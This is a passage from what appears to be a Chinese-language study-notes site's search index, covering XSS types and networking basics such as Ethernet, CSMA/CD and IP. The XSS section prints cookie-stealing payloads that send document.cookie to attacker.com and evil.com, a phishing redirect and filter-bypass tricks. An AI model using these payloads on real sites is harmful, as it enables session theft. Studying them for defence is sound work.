<pre><code>https://example.com/search?name=&lt;script&gt;...&lt;/script&gt;\n</code></pre> \u8bf1\u5bfc\u7528\u6237\u8bbf\u95ee\u8be5url</p>"},{"location":"owasp/xss/#persistent_stored_cross-site_scripting","title":"Persistent / Stored Cross-Site Scripting","text":"<p>\u6b64\u7c7b XSS \u4e0d\u9700\u8981\u7528\u6237\u5355\u51fb\u7279\u5b9a URL \u5c31\u80fd\u6267\u884c\u8de8\u7ad9\u811a\u672c\uff0c\u653b\u51fb\u8005\u4e8b\u5148\u5c06\u6076\u610f\u4ee3\u7801\u4e0a\u4f20\u6216\u50a8\u5b58\u5230\u6f0f\u6d1e\u670d\u52a1\u5668\u4e2d\uff0c\u53ea\u8981\u53d7\u5bb3\u8005\u6d4f\u89c8\u5305\u542b\u6b64\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u5c31\u4f1a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u6301\u4e45\u578b XSS \u4e00\u822c\u51fa\u73b0\u5728\u7f51\u7ad9\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u7b49\u4ea4\u4e92\u5904\uff0c\u6076\u610f\u811a\u672c\u5b58\u50a8\u5230\u5ba2\u6237\u7aef\u6216\u8005\u670d\u52a1\u7aef\u7684\u6570\u636e\u5e93\u4e2d\u3002</p> <p>\u670d\u52a1\u5668\u7aef\u4ee3\u7801 <pre><code>&lt;?php\n  if( isset( $_POST[ 'btnSign' ] ) ) {\n    // Get input\n    $message = trim( $_POST[ 'mtxMessage' ] );\n    $name    = trim( $_POST[ 'txtName' ] );\n    // Sanitize message input\n    $message = stripslashes( $message );\n    $message = mysql_real_escape_string( $message );\n    // Sanitize name input\n    $name = mysql_real_escape_string( $name );\n    // Update database\n    $query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n    $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );\n    //mysql_close(); }\n?&gt;\n</code></pre></p>"},{"location":"owasp/xss/#dom_document_object_model_xss","title":"DOM (Document Object Model) XSS","text":"<p>\u6076\u610f\u4ee3\u7801\u7684\u6267\u884c\u5b8c\u5168\u5728\u5ba2\u6237\u7aef\uff08\u6d4f\u89c8\u5668\uff09\u5b8c\u6210\uff0c\u4e0d\u6d89\u53ca\u670d\u52a1\u5668\u7aef\u53cd\u5c04</p> <pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;DOM-XSS test&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;script&gt;\n      var a=document.URL;\n      document.write(a.substring(a.indexOf(\"a=\")+2,a.length));\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"owasp/xss/#_1","title":"\u5229\u7528\u65b9\u5f0f","text":""},{"location":"owasp/xss/#cookie","title":"\u83b7\u53d6Cookie","text":"<p><pre><code>&lt;script&gt;\nfetch('https://attacker.com/steal?cookie=' + document.cookie);\n&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;\nnew Image().src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie\n&lt;/script&gt;\n</code></pre> <pre><code>&lt;script&gt;\ndocument.location=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie\n&lt;/script&gt;\n</code></pre></p>"},{"location":"owasp/xss/#_2","title":"\u4f1a\u8bdd\u52ab\u6301","text":""},{"location":"owasp/xss/#_3","title":"\u9493\u9c7c","text":"<p>\u91cd\u5b9a\u5411 <pre><code>http://www.bug.com/index.php?search=\"'&gt;&lt;script&gt;document.location.href=\"http://www.evil.com\"&lt;/script&gt;\n</code></pre></p>"},{"location":"owasp/xss/#_4","title":"\u9632\u5fa1 &amp; \u7ed5\u8fc7","text":"<p>\u8fc7\u6ee4\u6389 <code>&lt;script&gt;</code>  - \u5229\u7528 <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code> <pre><code>&lt;svg onload=\"alert(1)\"&gt;&lt;/svg&gt;\n</code></pre></p> <ul> <li>\u5229\u7528 on* \u4e8b\u4ef6 <pre><code>&lt;input name=keyword  value=\"\" onfocus=\"alert()\" autofocus=\"\"&gt;\n</code></pre></li> </ul> <p>\u8fc7\u6ee4\u6389 on \u4e8b\u4ef6 - \u5229\u7528 javascript: \u534f\u8bae\u7ed5\u8fc7</p> <p>html\u8f6c\u4e49 htmlspecialchars() \u5c06\u4ee5\u4e0b\u5b57\u7b26\u8f6c\u4e49\u4e3ahtml\u5b9e\u4f53\uff1a <pre><code>&amp; \u2192 &amp;amp;\n\" \u2192 &amp;quot; (\u5f53\u4f7f\u7528 ENT_QUOTES \u65f6\u4e5f\u4f1a\u8f6c\u4e49\u5355\u5f15\u53f7)\n' \u2192 &amp;#039; (\u4ec5\u5f53\u4f7f\u7528 ENT_QUOTES \u65f6)\n&lt; \u2192 &amp;lt;\n&gt; \u2192 &amp;gt;\n</code></pre></p>"},{"location":"web/Routing/","title":"Routing","text":""},{"location":"web/Routing/#routing","title":"Routing","text":""},{"location":"web/application/","title":"Application","text":""},{"location":"web/application/#application_layer","title":"\u5e94\u7528\u5c42\uff08Application Layer\uff09\u8be6\u89e3","text":"<p>\u5e94\u7528\u5c42\u662fOSI\u6a21\u578b\u7684\u7b2c\u4e03\u5c42\uff08TCP/IP\u6a21\u578b\u7684\u9876\u5c42\uff09\uff0c\u76f4\u63a5\u9762\u5411\u7528\u6237\u548c\u5e94\u7528\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u7f51\u7edc\u670d\u52a1\u7684\u63a5\u53e3\uff0c\u5b9e\u73b0\u5177\u4f53\u529f\u80fd\uff08\u5982\u7f51\u9875\u6d4f\u89c8\u3001\u6587\u4ef6\u4f20\u8f93\u3001\u90ae\u4ef6\u6536\u53d1\uff09\u3002\u4ee5\u4e0b\u662f\u7cfb\u7edf\u5316\u89e3\u6790\uff1a</p>"},{"location":"web/application/#_1","title":"\u4e00\u3001\u5e94\u7528\u5c42\u7684\u6838\u5fc3\u4f5c\u7528","text":"\u529f\u80fd \u8bf4\u660e \u7528\u6237\u4ea4\u4e92 \u63d0\u4f9b\u76f4\u89c2\u7684\u754c\u9762\uff08\u5982\u6d4f\u89c8\u5668\u3001\u90ae\u4ef6\u5ba2\u6237\u7aef\uff09\u4e0e\u7f51\u7edc\u670d\u52a1\u4ea4\u4e92\u3002 \u534f\u8bae\u4e0e\u670d\u52a1\u5b9e\u73b0 \u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u95f4\u7684\u901a\u4fe1\u89c4\u5219\uff08\u5982HTTP\u3001FTP\u3001SMTP\uff09\u3002 \u6570\u636e\u683c\u5f0f\u6807\u51c6\u5316 \u89c4\u8303\u6570\u636e\u7684\u7f16\u7801\u4e0e\u89e3\u6790\uff08\u5982HTML\u3001JSON\u3001XML\uff09\u3002 \u8de8\u5e73\u53f0\u517c\u5bb9\u6027 \u5c4f\u853d\u5e95\u5c42\u7f51\u7edc\u7ec6\u8282\uff0c\u4f7f\u4e0d\u540c\u8bbe\u5907\uff08\u624b\u673a\u3001\u7535\u8111\uff09\u80fd\u8bbf\u95ee\u76f8\u540c\u670d\u52a1\u3002"},{"location":"web/application/#_2","title":"\u4e8c\u3001\u5178\u578b\u5e94\u7528\u5c42\u534f\u8bae","text":""},{"location":"web/application/#1","title":"1. \u57fa\u7840\u670d\u52a1\u534f\u8bae","text":"\u534f\u8bae \u7528\u9014 \u7aef\u53e3 \u793a\u4f8b\u573a\u666f HTTP \u8d85\u6587\u672c\u4f20\u8f93\uff08\u7f51\u9875\u6d4f\u89c8\uff09 80/443 \u8bbf\u95ee<code>https://www.example.com</code> FTP \u6587\u4ef6\u4f20\u8f93 20/21 \u4e0a\u4f20\u6587\u4ef6\u5230\u670d\u52a1\u5668 SMTP \u53d1\u9001\u7535\u5b50\u90ae\u4ef6 25 \u901a\u8fc7Outlook\u53d1\u9001\u90ae\u4ef6 POP3 \u63a5\u6536\u7535\u5b50\u90ae\u4ef6\uff08\u4e0b\u8f7d\u5230\u672c\u5730\uff09 110 \u4ece\u670d\u52a1\u5668\u4e0b\u8f7d\u90ae\u4ef6\u5230\u672c\u5730\u5ba2\u6237\u7aef IMAP \u63a5\u6536\u7535\u5b50\u90ae\u4ef6\uff08\u670d\u52a1\u5668\u7ba1\u7406\uff09 143 \u5728\u624b\u673a\u548c\u7535\u8111\u540c\u6b65\u67e5\u770b\u90ae\u4ef6 DNS \u57df\u540d\u89e3\u6790\uff08IP\u5730\u5740\u67e5\u8be2\uff09 53 \u5c06<code>www.google.com</code>\u89e3\u6790\u4e3a<code>8.8.8.8</code> SSH \u5b89\u5168\u8fdc\u7a0b\u767b\u5f55 22 \u8fdc\u7a0b\u7ba1\u7406Linux\u670d\u52a1\u5668 TELNET \u8fdc\u7a0b\u767b\u5f55 23 \u8fdc\u7a0b\u7ba1\u7406Linux\u670d\u52a1\u5668"},{"location":"web/application/#2","title":"2. \u73b0\u4ee3\u5e94\u7528\u534f\u8bae","text":"\u534f\u8bae \u7528\u9014 \u7279\u70b9 HTTPS \u52a0\u5bc6\u7684HTTP \u4f7f\u7528TLS/SSL\u52a0\u5bc6\uff08\u5982\u94f6\u884c\u7f51\u7ad9\uff09 MQTT \u7269\u8054\u7f51\u8f7b\u91cf\u7ea7\u901a\u4fe1 \u4f4e\u529f\u8017\u3001\u53d1\u5e03-\u8ba2\u9605\u6a21\u5f0f\uff08\u5982\u667a\u80fd\u5bb6\u5c45\uff09 REST \u57fa\u4e8eHTTP\u7684API\u8bbe\u8ba1\u98ce\u683c \u4f7f\u7528JSON/XML\u4f20\u8f93\u6570\u636e\uff08\u5982\u5929\u6c14API\uff09 WebSocket \u5168\u53cc\u5de5\u5b9e\u65f6\u901a\u4fe1 \u4fdd\u6301\u957f\u8fde\u63a5\uff08\u5982\u5728\u7ebf\u804a\u5929\u5ba4\uff09"},{"location":"web/application/#_3","title":"\u4e09\u3001\u5e94\u7528\u5c42\u4e0e\u4e0b\u5c42\u7684\u5173\u7cfb","text":""},{"location":"web/application/#1_tcpudp","title":"1. \u4f9d\u8d56\u4f20\u8f93\u5c42\uff08TCP/UDP\uff09","text":"<ul> <li>TCP\u534f\u8bae\uff1a\u7528\u4e8e\u9700\u8981\u53ef\u9760\u4f20\u8f93\u7684\u670d\u52a1\uff08\u5982HTTP\u3001FTP\u3001SMTP\uff09\u3002  </li> <li>UDP\u534f\u8bae\uff1a\u7528\u4e8e\u5b9e\u65f6\u6027\u8981\u6c42\u9ad8\u7684\u670d\u52a1\uff08\u5982DNS\u67e5\u8be2\u3001\u89c6\u9891\u6d41\uff09\u3002  </li> </ul>"},{"location":"web/application/#2_1","title":"2. \u6570\u636e\u5c01\u88c5\u6d41\u7a0b","text":"<p><pre><code>\u5e94\u7528\u6570\u636e\uff08\u5982HTTP\u8bf7\u6c42\uff09 \u2192 \u4f20\u8f93\u5c42\uff08TCP/UDP\u5934\u90e8\uff09 \u2192 \u7f51\u7edc\u5c42\uff08IP\u5934\u90e8\uff09 \u2192 \u94fe\u8def\u5c42\uff08\u5e27\u5934\u5c3e\uff09\n</code></pre> - \u793a\u4f8b\uff1a   - \u7528\u6237\u8f93\u5165<code>https://www.example.com</code>\u540e\uff1a     1. DNS\u89e3\u6790\u57df\u540d\u2192IP\uff08<code>93.184.216.34</code>\uff09\u3002     2. HTTP\u751f\u6210\u8bf7\u6c42\uff0cTCP\u5c01\u88c5\u4e3a\u6bb5\uff08\u76ee\u6807\u7aef\u53e3443\uff09\u3002     3. IP\u5c42\u6dfb\u52a0\u5730\u5740\uff0c\u94fe\u8def\u5c42\u901a\u8fc7MAC\u5730\u5740\u53d1\u9001\u3002  </p>"},{"location":"web/application/#_4","title":"\u56db\u3001\u5173\u952e\u6280\u672f\u4e0e\u6982\u5ff5","text":""},{"location":"web/application/#1_-","title":"1. \u5ba2\u6237\u7aef-\u670d\u52a1\u5668\u6a21\u578b","text":"<ul> <li>\u5ba2\u6237\u7aef\uff1a\u53d1\u8d77\u8bf7\u6c42\uff08\u5982\u6d4f\u89c8\u5668\u3001\u624b\u673aAPP\uff09\u3002  </li> <li>\u670d\u52a1\u5668\uff1a\u54cd\u5e94\u8bf7\u6c42\uff08\u5982Nginx\u3001Apache\uff09\u3002  </li> </ul>"},{"location":"web/application/#2_p2p","title":"2. P2P\uff08\u5bf9\u7b49\u7f51\u7edc\uff09","text":"<ul> <li>\u7279\u70b9\uff1a\u8282\u70b9\u65e2\u662f\u5ba2\u6237\u7aef\u4e5f\u662f\u670d\u52a1\u5668\uff08\u5982BitTorrent\u3001\u533a\u5757\u94fe\uff09\u3002  </li> </ul>"},{"location":"web/application/#3_api","title":"3. API\uff08\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3\uff09","text":"<ul> <li>\u4f5c\u7528\uff1a\u6807\u51c6\u5316\u670d\u52a1\u8c03\u7528\u65b9\u5f0f\uff08\u5982Twitter API\u83b7\u53d6\u63a8\u6587\uff09\u3002  </li> </ul>"},{"location":"web/application/#4","title":"4. \u6570\u636e\u683c\u5f0f","text":"\u683c\u5f0f \u7528\u9014 \u793a\u4f8b HTML \u7f51\u9875\u7ed3\u6784\u6807\u8bb0 <code>&lt;h1&gt;Hello World&lt;/h1&gt;</code> JSON \u8f7b\u91cf\u7ea7\u6570\u636e\u4ea4\u6362 <code>{\"name\": \"Alice\", \"age\": 25}</code> XML \u7ed3\u6784\u5316\u6570\u636e\u5b58\u50a8 <code>&lt;user&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;/user&gt;</code>"},{"location":"web/application/#_5","title":"\u4e94\u3001\u5e38\u89c1\u95ee\u9898","text":""},{"location":"web/application/#q1dns","title":"Q1\uff1a\u4e3a\u4ec0\u4e48DNS\u5c5e\u4e8e\u5e94\u7528\u5c42\uff1f","text":"<ul> <li>\u7b54\uff1aDNS\u662f\u5e94\u7528\u7a0b\u5e8f\uff08\u5982\u6d4f\u89c8\u5668\uff09\u76f4\u63a5\u8c03\u7528\u7684\u670d\u52a1\uff0c\u901a\u8fc7UDP/TCP\u4f20\u8f93\uff0c\u4f46\u529f\u80fd\u5c5e\u4e8e\u57df\u540d\u89e3\u6790\uff0c\u6545\u5f52\u4e3a\u5e94\u7528\u5c42\u3002</li> </ul>"},{"location":"web/application/#q2httpwebsocket","title":"Q2\uff1aHTTP\u4e0eWebSocket\u7684\u533a\u522b\uff1f","text":"<ul> <li>HTTP\uff1a\u65e0\u72b6\u6001\u3001\u77ed\u8fde\u63a5\uff08\u6bcf\u6b21\u8bf7\u6c42\u9700\u91cd\u65b0\u5efa\u7acb\uff09\u3002  </li> <li>WebSocket\uff1a\u6709\u72b6\u6001\u3001\u957f\u8fde\u63a5\uff08\u9002\u5408\u5b9e\u65f6\u53cc\u5411\u901a\u4fe1\uff09\u3002  </li> </ul>"},{"location":"web/application/#q3","title":"Q3\uff1a\u5982\u4f55\u5f00\u53d1\u4e00\u4e2a\u5e94\u7528\u5c42\u534f\u8bae\uff1f","text":"<ul> <li>\u6b65\u9aa4\uff1a  </li> <li>\u5b9a\u4e49\u6d88\u606f\u683c\u5f0f\uff08\u5982JSON\u5b57\u6bb5\uff09\u3002  </li> <li>\u9009\u62e9\u4f20\u8f93\u5c42\u534f\u8bae\uff08TCP/UDP\uff09\u3002  </li> <li>\u6307\u5b9a\u7aef\u53e3\u53f7\uff08\u9700\u907f\u514d\u51b2\u7a81\uff09\u3002  </li> </ul>"},{"location":"web/application/#_6","title":"\u516d\u3001\u603b\u7ed3","text":"<p>\u5e94\u7528\u5c42\u662f\u7528\u6237\u4e0e\u7f51\u7edc\u4e16\u754c\u7684\u6865\u6881\uff0c\u5176\u6838\u5fc3\u4ef7\u503c\u5728\u4e8e\uff1a 1. \u529f\u80fd\u76f4\u63a5\u53ef\u89c1\uff08\u5982\u7f51\u9875\u3001\u90ae\u4ef6\u3001\u89c6\u9891\uff09\u3002 2. \u534f\u8bae\u9ad8\u5ea6\u591a\u6837\u5316\uff0c\u9002\u5e94\u4e0d\u540c\u573a\u666f\u9700\u6c42\u3002 3. \u5c4f\u853d\u5e95\u5c42\u590d\u6742\u6027\uff0c\u5f00\u53d1\u8005\u53ea\u9700\u5173\u6ce8\u4e1a\u52a1\u903b\u8f91\u3002  </p> <p>\u7406\u89e3\u5e94\u7528\u5c42\u534f\u8bae\u7684\u8bbe\u8ba1\u4e0e\u4ea4\u4e92\uff0c\u662f\u5f00\u53d1\u7f51\u7edc\u5e94\u7528\uff08\u5982APP\u3001\u7f51\u7ad9\uff09\u6216\u6392\u67e5\u670d\u52a1\u95ee\u9898\uff08\u5982API\u8c03\u7528\u5931\u8d25\uff09\u7684\u57fa\u7840\u3002</p>"},{"location":"web/applications/","title":"Application","text":""},{"location":"web/applications/#dns","title":"DNS","text":""},{"location":"web/applications/#dns_uses_udp","title":"DNS uses UDP","text":""},{"location":"web/applications/#dns_message_format","title":"DNS Message Format","text":""},{"location":"web/end-to-end/","title":"End-to-End","text":""},{"location":"web/end-to-end/#ethernet","title":"Ethernet","text":""},{"location":"web/end-to-end/#local_networks","title":"Local Networks","text":"<p>The predominant protocol at Layer 2 is Ethernet.</p>"},{"location":"web/end-to-end/#connecting_local_hosts","title":"Connecting Local Hosts","text":"<p>In reality, a single wire might be used to connect multiple machines. In the local network, the hosts and the router can all be on the same wire. We can abstract even further and note that at Layer 2, the router is really just a machine like any other.</p> <p>A mesh topology is impractical. If a new host joins, we\u2019d have to add a wire connecting it to every other host.  However, a bus topology, where we connect all the computers along a single wire, is pretty common and practical in a local network.</p> <p>The single-wire bus topology introduces the notion of a shared media.</p>"},{"location":"web/end-to-end/#coordinated_approaches","title":"Coordinated Approaches","text":"<p>In a network with a shared medium, there\u2019s a risk that transmissions from different nodes may interfere or collide with each other. To solve this problem, we need a multiple access protocol that ensures that multiple computers can share the link and transmit over it.</p>"},{"location":"web/end-to-end/#multiplexing","title":"Multiplexing","text":"<p>One possible category of approaches is to allocate a fixed portion of resources to each node on the link. There are two ways we could consider dividing up the resources.  - In frequency-division multiplexing, we allocate a different slice of frequencies to each computer. (Consider AM/FM radio or broadcast TV, which divide up frequencies into channels.)  - In time-division multiplexing, we divide time into fixed slots and allocate a slot to every connected node.</p>"},{"location":"web/end-to-end/#taking_turns","title":"Taking Turns","text":"<p>In this category, we\u2019re dynamically partitioning by time, so that nodes use only the time they need during their turn, with no wasted time. There are two ways we could consider having nodes take turns.</p> <ul> <li>In a polling protocol, a centralized coordinator decides when each connected node gets to speak. The coordinator goes to each node one by one and asks if the node has something to say. If the node says yes, the coordinator lets the node speak for some time. If the node says no, the coordinator immediately moves on to the next node.    Bluetooth is a real-world protocol using this idea.</li> <li>The other way is token passing. We have a virtual token that can be passed between nodes, and only the node with the token is allowed to speak. If a node has something to say, it holds onto the token while transmitting, then passes it to the next node. If a node doesn\u2019t have anything to say at the moment, it immediately passes the token to the next node.    IBM Token Ring and FDDI are real-world examples of protocols that use this idea.</li> </ul>"},{"location":"web/end-to-end/#random_access","title":"Random Access","text":"<p>In this approach, we just allow nodes to talk whenever they have something to say, and deal with collisions when they occur. The nodes don\u2019t coordinate between each other, and just send data whenever they have something to send.</p> <p>When the recipient gets a packet, it replies with an ack. If two nodes send data simultaneously, the collision causes their packets to be corrupted, so no ack is sent. If the sender doesn\u2019t see an ack, it waits some random amount of time and re-sends. </p> <p>A more \u201cpolite\u201d variant of this protocol is called Carrier Sense Multiple Access (CSMA). Nodes listen (sensing a signal on the wire) to the shared medium first to see if anybody is speaking, and only start talking when it is quiet.  However, propagation delay can introduce issues.</p> <p>To mitigate this problem, we can use CSMA/CD (Carrier Sense Multiple Access with Collision Detection). In addition to listening before speaking, we also listen while we speak. If you start hearing something while you\u2019re transmitting, you stop immediately.</p> <p>To deal with repeated collisions, CSMA/CD uses binary exponential backoff. Each time we detect a collision on a retransmission attempt, we wait up to twice as long before the next retransmission.  Note that we still randomly choose the retransimssion time, but each time we detect a collision, we choose the random number from a range with a limit that\u2019s twice as high. For example, if we chose a random time in the range [0, 4] and detected a collision, the next random time we choose is in the range [0, 8].</p>"},{"location":"web/end-to-end/#lan_communication_mac_addresses","title":"LAN Communication: MAC Addresses","text":"<p>At Layer 2, every computer has a MAC address (Media Access Control).  MAC addresses are 48 bits long, and are usually written in hexadecimal with colons separating every 2 digits, e.g. <code>f8:ff:c2:2b:36:16</code>. MAC addresses are sometimes called ether addresses or link addresses.</p> <p>MAC addresses are usually permanently hard-coded (\u201cburned in\u201d) on a device,  which is different from IP, where you receive an address when you first join a network, and the address depends on your geographic location.</p>"},{"location":"web/end-to-end/#lan_communication_types","title":"LAN Communication Types","text":"<p>There are different possible destinations in a Layer 2 packet.  - In unicast, the packet is intended to a single recipient.  - In broadcast, the packet is intended for all machines on the local network.  - In multicast, the packet is intended for all machines in the local network that belong to a particular group. Machines can choose to join certain groups to receive packets meant for that group.</p>"},{"location":"web/end-to-end/#ethernet_packet_structure","title":"Ethernet Packet Structure","text":"<p>A data packet in Ethernet is called a frame.</p> <p></p> <p>To broadcast a message, we set the destination MAC to the special address <code>FF:FF:FF:FF:FF:FF</code> (all ones).</p> <p>To multicast a message, we set the destination MAC to the address of that group. Recall that the first two bits of the MAC addresses are flags. Normal addresses allocated to machines always set the first bit to 0, and addresses for groups always set the first bit to 1. </p>"},{"location":"web/end-to-end/#layer_2_networks_with_ethernet","title":"Layer 2 Networks with Ethernet","text":"<p>We could introduce multiple links and build a network entirely using Layer 2. Packets could be forwarded, and machines could even run routing protocols, all exclusively using Layer 2 MAC addresses.</p>"},{"location":"web/internet/","title":"Internet","text":""},{"location":"web/internet/#network_layer","title":"\u7f51\u7edc\u5c42\uff08Network Layer\uff09\u8be6\u89e3","text":"<p>\u7f51\u7edc\u5c42\u662fOSI\u6a21\u578b\u7684\u7b2c\u4e09\u5c42\uff08TCP/IP\u6a21\u578b\u7684\u7f51\u9645\u5c42\uff09\uff0c\u6838\u5fc3\u4efb\u52a1\u662f\u5b9e\u73b0\u8de8\u7f51\u7edc\u7684\u7aef\u5230\u7aef\u6570\u636e\u4f20\u8f93\uff0c\u89e3\u51b3\u4e0d\u540c\u7f51\u7edc\u95f4\u7684\u8def\u7531\u4e0e\u5bfb\u5740\u95ee\u9898\u3002\u4ee5\u4e0b\u662f\u7cfb\u7edf\u5316\u7684\u6846\u67b6\u89e3\u6790\uff1a</p>"},{"location":"web/internet/#_1","title":"\u4e00\u3001\u7f51\u7edc\u5c42\u7684\u6838\u5fc3\u529f\u80fd","text":"\u529f\u80fd \u8bf4\u660e \u903b\u8f91\u5bfb\u5740 \u5206\u914dIP\u5730\u5740\uff08IPv4/IPv6\uff09\u552f\u4e00\u6807\u8bc6\u4e3b\u673a\u548c\u7f51\u7edc\u3002 \u8def\u7531\u9009\u62e9 \u901a\u8fc7\u8def\u7531\u534f\u8bae\uff08\u5982OSPF\u3001BGP\uff09\u9009\u62e9\u6700\u4f18\u8def\u5f84\u8f6c\u53d1\u6570\u636e\u5305\u3002 \u5206\u7ec4\u5c01\u88c5\u4e0e\u5206\u7247 \u5c06\u4e0a\u5c42\u6570\u636e\u5c01\u88c5\u4e3aIP\u6570\u636e\u62a5\uff0c\u5fc5\u8981\u65f6\u5206\u7247\u4ee5\u9002\u5e94\u4e0d\u540c\u94fe\u8def\u7684MTU\u3002 \u8de8\u7f51\u7edc\u901a\u4fe1 \u89e3\u51b3\u5f02\u6784\u7f51\u7edc\uff08\u5982\u4ee5\u592a\u7f51\u3001Wi-Fi\u30015G\uff09\u4e92\u8054\u95ee\u9898\u3002 \u62e5\u585e\u63a7\u5236 \u901a\u8fc7TTL\uff08\u751f\u5b58\u65f6\u95f4\uff09\u7b49\u673a\u5236\u907f\u514d\u6570\u636e\u5305\u65e0\u9650\u5faa\u73af\u3002"},{"location":"web/internet/#_2","title":"\u4e8c\u3001\u6838\u5fc3\u534f\u8bae\u4e0e\u6280\u672f","text":""},{"location":"web/internet/#1_ipinternet_protocol","title":"1. IP\u534f\u8bae\uff08Internet Protocol\uff09","text":"<ul> <li>IPv4\uff1a32\u4f4d\u5730\u5740\uff0c\u4f7f\u7528\u70b9\u5206\u5341\u8fdb\u5236\uff08\u5982<code>192.168.1.1</code>\uff09\u3002  </li> <li>\u5173\u952e\u5b57\u6bb5\uff1a\u7248\u672c\u3001TTL\u3001\u534f\u8bae\u53f7\uff08\u5982TCP=6\uff09\u3001\u6e90/\u76ee\u6807IP\u5730\u5740\u3002  </li> <li>IPv6\uff1a128\u4f4d\u5730\u5740\uff0c\u5341\u516d\u8fdb\u5236\u8868\u793a\uff08\u5982<code>2001:0db8::1</code>\uff09\uff0c\u89e3\u51b3\u5730\u5740\u8017\u5c3d\u95ee\u9898\u3002  </li> </ul>"},{"location":"web/internet/#2","title":"2. \u8f85\u52a9\u534f\u8bae","text":"\u534f\u8bae \u4f5c\u7528 ICMP \u4f20\u9012\u7f51\u7edc\u72b6\u6001\u4fe1\u606f\uff08\u5982<code>ping</code>\u3001<code>traceroute</code>\uff09\u3002 ARP \u5c06IP\u5730\u5740\u89e3\u6790\u4e3aMAC\u5730\u5740\uff08\u5c40\u57df\u7f51\u5185\uff09\u3002 RARP \u53cd\u5411\u5730\u5740\u89e3\u6790\u534f\u8bae\uff08\u5df2\u6dd8\u6c70\uff0c\u7531DHCP\u66ff\u4ee3\uff09\u3002 \u8def\u7531\u534f\u8bae - \u5185\u90e8\u7f51\u5173\u534f\u8bae\uff08IGP\uff09\uff1aOSPF\u3001RIP\uff08\u540c\u4e00\u81ea\u6cbb\u7cfb\u7edf\u5185\u8def\u7531\uff09\u3002- \u5916\u90e8\u7f51\u5173\u534f\u8bae\uff08EGP\uff09\uff1aBGP\uff08\u8de8\u81ea\u6cbb\u7cfb\u7edf\u8def\u7531\uff09\u3002"},{"location":"web/internet/#ippacket","title":"\u4e09\u3001IP\u6570\u636e\u62a5\uff08Packet\uff09\u7ed3\u6784","text":""},{"location":"web/internet/#ipv4","title":"IPv4\u6570\u636e\u62a5\u683c\u5f0f","text":"<p><pre><code>| \u7248\u672c (4) | \u9996\u90e8\u957f\u5ea6 | \u670d\u52a1\u7c7b\u578b | \u603b\u957f\u5ea6 |\n| \u6807\u8bc6\u7b26       | \u6807\u5fd7\u4f4d | \u5206\u7247\u504f\u79fb |\n| \u751f\u5b58\u65f6\u95f4 (TTL) | \u534f\u8bae\u53f7 | \u9996\u90e8\u6821\u9a8c\u548c |\n| \u6e90IP\u5730\u5740 (32\u4f4d)         |\n| \u76ee\u6807IP\u5730\u5740 (32\u4f4d)        |\n| \u53ef\u9009\u5b57\u6bb5\uff08\u5982\u65f6\u95f4\u6233\uff09       |\n| \u6570\u636e\uff08\u4e0a\u5c42\u534f\u8bae\u62a5\u6587\uff09        |\n</code></pre> - \u5173\u952e\u5b57\u6bb5\u8bf4\u660e\uff1a   - TTL\uff1a\u6bcf\u7ecf\u8fc7\u4e00\u4e2a\u8def\u7531\u5668\u51cf1\uff0c\u5f52\u96f6\u65f6\u4e22\u5f03\uff08\u9632\u6b62\u73af\u8def\uff09\u3002   - \u534f\u8bae\u53f7\uff1a\u6307\u793a\u4e0a\u5c42\u534f\u8bae\uff08\u5982TCP=6\u3001UDP=17\uff09\u3002  </p>"},{"location":"web/internet/#_3","title":"\u56db\u3001\u8def\u7531\u4e0e\u8f6c\u53d1\u673a\u5236","text":""},{"location":"web/internet/#1_routing_table","title":"1. \u8def\u7531\u8868\uff08Routing Table\uff09","text":"<p>\u8def\u7531\u5668\u6839\u636e\u8def\u7531\u8868\u51b3\u5b9a\u6570\u636e\u5305\u4e0b\u4e00\u8df3\uff0c\u5305\u542b\u4ee5\u4e0b\u4fe1\u606f\uff1a | \u76ee\u6807\u7f51\u7edc | \u5b50\u7f51\u63a9\u7801 | \u4e0b\u4e00\u8df3    | \u63a5\u53e3 | |-------------|-------------|--------------|----------| | 192.168.1.0 | 255.255.255.0 | \u76f4\u63a5\u4ea4\u4ed8      | eth0     | | 0.0.0.0     | 0.0.0.0      | 203.0.113.1  | eth1     | \uff08\u9ed8\u8ba4\u8def\u7531\uff09</p>"},{"location":"web/internet/#2_1","title":"2. \u8def\u7531\u9009\u62e9\u65b9\u5f0f","text":"<ul> <li>\u9759\u6001\u8def\u7531\uff1a\u7ba1\u7406\u5458\u624b\u52a8\u914d\u7f6e\uff08\u9002\u5408\u5c0f\u578b\u7f51\u7edc\uff09\u3002  </li> <li>\u52a8\u6001\u8def\u7531\uff1a  </li> <li>\u8ddd\u79bb\u5411\u91cf\u534f\u8bae\uff08\u5982RIP\uff09\uff1a\u57fa\u4e8e\u8df3\u6570\u9009\u62e9\u8def\u5f84\u3002  </li> <li>\u94fe\u8def\u72b6\u6001\u534f\u8bae\uff08\u5982OSPF\uff09\uff1a\u57fa\u4e8e\u5e26\u5bbd\u3001\u5ef6\u8fdf\u7b49\u7efc\u5408\u5ea6\u91cf\u3002  </li> </ul>"},{"location":"web/internet/#_4","title":"\u4e94\u3001\u8de8\u7f51\u7edc\u901a\u4fe1\u6d41\u7a0b","text":"<p>\u793a\u4f8b\uff1a\u4e3b\u673aA\uff08<code>192.168.1.2</code>\uff09\u8bbf\u95ee\u670d\u52a1\u5668B\uff08<code>203.0.113.5</code>\uff09\u3002 1. \u5c01\u88c5IP\u6570\u636e\u62a5\uff1a\u4e3b\u673aA\u5c06HTTP\u8bf7\u6c42\u5c01\u88c5\u4e3aIP\u6570\u636e\u62a5\uff0c\u76ee\u6807IP=<code>203.0.113.5</code>\u3002 2. \u67e5\u8be2\u8def\u7531\u8868\uff1a    - 